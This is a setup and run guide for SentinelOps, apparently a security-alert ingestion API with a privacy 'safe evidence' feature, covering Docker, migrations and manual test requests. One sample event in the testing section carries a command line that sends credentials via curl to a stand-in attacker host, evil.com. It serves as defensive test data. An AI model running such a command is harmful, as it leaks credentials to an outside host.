# Running SentinelOps

## Prerequisites
- Docker & Docker Compose
- Python 3.10+
- PowerShell (Windows) or Bash (Linux/Mac)

## 1. Start Database
```powershell
docker-compose up -d
```
*Expected: PostgreSQL starts on port 5432 with database `sentinelops`.*

## 2. Install Dependencies
```powershell
pip install fastapi uvicorn "sqlalchemy[asyncio]" asyncpg aiosqlite pytest pytest-asyncio httpx pydantic-settings alembic
```

## 3. Run Database Migrations
```powershell
# Set database URL to postgres for alembic
$env:DATABASE_URL="postgresql+asyncpg://admin:supersecretpassword@localhost:5432/sentinelops"
python -m alembic upgrade head
```

## 4. Start SentinelOps API Server
```powershell
uvicorn src.main:app --reload
```
*Expected: Server running at http://127.0.0.1:8000*

## 5. Verify Health
Open browser or use PowerShell:
```powershell
Invoke-RestMethod -Uri http://localhost:8000/api/v1/health
```

## 6. Manual Testing (Ingestion & Privacy)

**Ingest an Event:**
```powershell
Invoke-RestMethod -Uri "http://localhost:8000/api/v1/events" -Method Post -ContentType "application/json" -Body '{ "tenant_id": "T1", "source_type": "XDR", "source_vendor": "Mock", "source_product": "XDR", "payload": { "event_id": "v123", "detected_at": "2023-10-01T12:00:00Z", "username": "alice@bank.com", "src_ip": "10.0.4.15", "cmdline": "curl -u admin:supersecret123 http://evil.com" } }'
```

**Generate Safe Evidence Package:**
*(Replace `<INSERT_ALERT_ID>` with the `normalized_alert_id` from the ingestion response)*
```powershell
Invoke-RestMethod -Uri "http://localhost:8000/api/v1/privacy/safe-evidence" -Method Post -ContentType "application/json" -Body '{ "tenant_id": "T1", "alert_ids": ["<INSERT_ALERT_ID>"] }'
```
